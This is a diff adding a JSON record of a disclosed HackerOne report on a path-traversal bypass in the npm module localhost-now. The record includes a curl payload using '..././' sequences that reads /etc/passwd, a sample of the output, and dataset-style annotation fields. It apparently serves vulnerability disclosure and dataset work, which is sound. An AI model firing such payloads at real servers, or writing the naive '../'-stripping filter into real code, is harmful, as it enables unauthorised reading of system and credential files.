@@ -1,0 +1,42 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "caioluders ",
+  "title": "Bypass to defective fix of Path Traversal ",
+  "content": "\nI would like to report a Path Traversal vulnerability in localhost-now. It allows to read arbitrary files on the server. This is a bypass on the mitigation of #312889 .\nModule\nmodule name: localhost-now\nversion: 1.0.2\nnpm page: https://www.npmjs.com/package/localhost-now\nModule Description\nAm I the only one who is lazy to install Apache just for testing some HTML or JavaScript code (like XHR) ?\nModule Stats\n[13] downloads in the last week\nVulnerability\nVulnerability Description\nA path traversal attack aims to access files and directories that are stored outside the web root folder.\nSteps To Reproduce:\nInstall localhost-now\nRun localhost-now on directory\nCode 68 Bytes\n1ec2-user@kali:~$ localhost 5432\n2Web Server started on localhost:5432\nExecute the curl command\nCode 235 Bytes\n1$ curl -v --path-as-is \"http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd\"\n2root:x:0:0:root:/root:/usr/bin/fish\n3daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n4bin:x:2:2:bin:/bin:/usr/sbin/nologin\n5...\nThe problem resides on the line 17 as the code just delete all the '../' strings , allowing a payload like \"..././\" to be transformed back in \"../\" .\nSupporting Material/References:\nOS version :Linux kali 4.13.0\nNodeJS version : v8.10.0\nNPM version : 5.6.0\nWrap up\nI contacted the maintainer to let them know: No\nI opened an issue in the related repository: No\nImpact\nThe attacker can read remotely all files on the server.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1526067900,
+  "report_url": "https://hackerone.com/reports/329837",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install localhost-now"
+    ],
+    [
+      2,
+      "Run localhost-now on a directory"
+    ],
+    [
+      3,
+      "Execute the curl command with a crafted path traversal payload: curl -v --path-as-is \"http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd\""
+    ]
+  ],
+  "vuln_description": "A path traversal vulnerability in localhost-now allows reading arbitrary files on the server by bypassing a defective fix that only removes '../' strings. An attacker can use a payload like '..././' which gets transformed back into '../', enabling access to files outside the web root.",
+  "reason": "The vulnerability involves a simple bypass of a flawed mitigation (removing '../' strings) using a non-obvious payload ('..././'). The attack does not require multiple components, complex state manipulation, or novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "312889"
+}
